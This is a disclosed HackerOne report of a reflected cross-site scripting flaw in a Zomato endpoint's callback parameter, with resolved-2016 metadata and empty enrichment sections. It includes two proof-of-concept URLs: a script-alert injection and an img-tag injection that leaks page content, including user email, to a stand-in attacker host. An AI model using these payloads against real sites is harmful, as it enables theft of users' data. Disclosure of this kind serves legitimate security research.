---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '138262'
original_report_id: '138262'
title: Reflected Cross-Site Scripting in www.zomato.com/php/instagram_tag_relay
weakness: Cross-site Scripting (XSS) - Generic
team_handle: zomato
created_at: '2016-05-12T11:38:49.694Z'
disclosed_at: '2016-06-16T10:01:21.813Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# Reflected Cross-Site Scripting in www.zomato.com/php/instagram_tag_relay

## Metadata

- HackerOne Report ID: 138262
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: zomato
- Disclosed At: 2016-06-16T10:01:21.813Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

`https://www.zomato.com/php/instagram_tag_relay` is vulnerable to XSS via the `callback` parameter (both POST and GET).

PoC:  
`https://www.zomato.com/php/instagram_tag_relay?callback=%3Cscript%3Ealert(document.domain)%3C/script%3E`

In addition, when a Zomato user accesses the page after having connected his Zomato account to Instagram, the page contains sensitive data (such as the user's email address). An attacker can use the vulnerability to access this data. 

PoC:
`https://www.zomato.com/php/instagram_tag_relay?callback=><img+src%3dhttps%3a//example.org/%3f`

(causes the victim's browser to send a request to the attacker's server `example.org`, leaking the page's content).

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
